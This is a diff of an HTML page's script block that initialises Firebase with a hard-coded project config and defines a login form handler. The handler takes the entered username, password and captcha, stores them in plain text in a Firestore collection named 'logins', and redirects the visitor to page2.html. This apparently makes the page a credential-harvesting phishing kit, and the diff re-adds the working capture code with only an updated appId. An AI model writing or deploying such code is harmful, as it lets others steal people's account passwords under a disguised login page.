@@ -145,42 +145,40 @@
     <img class="bottom-image" src="https://i.ibb.co/m3m0QQH/IMG-20250419-213149.jpg" alt="Extra Image">
   </div>
 
-  <script>
-    // Firebase Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
-      authDomain: "dlhiljbrd.firebaseapp.com",
-      projectId: "dlhiljbrd",
-      storageBucket: "dlhiljbrd.firebasestorage.app",
-      messagingSenderId: "981951131769",
-      appId: "1:981951131769:web:6ba4d6bfa570ffa62664a8"
-    };
+<script>
+  // Firebase Config - UPDATED
+  const firebaseConfig = {
+    apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+    authDomain: "dlhiljbrd.firebaseapp.com",
+    projectId: "dlhiljbrd",
+    storageBucket: "dlhiljbrd.firebasestorage.app",
+    messagingSenderId: "981951131769",
+    appId: "1:981951131769:web:5d56cd1423d753992664a8"
+  };
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
 
-    // Form submission
-    function submitForm(e) {
-      e.preventDefault();
+  // Form submission
+  function submitForm(e) {
+    e.preventDefault();
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const captcha = document.getElementById("captcha").value;
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const captcha = document.getElementById("captcha").value;
 
-      db.collection("logins").add({
-        username: username,
-        password: password,
-        captcha: captcha,
-        timestamp: new Date()
-      }).then(() => {
-        window.location.href = "page2.html"; // Redirect on success
-      }).catch((error) => {
-        alert("Error saving data: " + error);
-      });
+    db.collection("logins").add({
+      username: username,
+      password: password,
+      captcha: captcha,
+      timestamp: new Date()
+    }).then(() => {
+      window.location.href = "page2.html"; // Redirect on success
+    }).catch((error) => {
+      alert("Error saving data: " + error);
+    });
 
-      return false;
-    }
-  </script>
-</body>
-</html>
+    return false;
+  }
+</script>
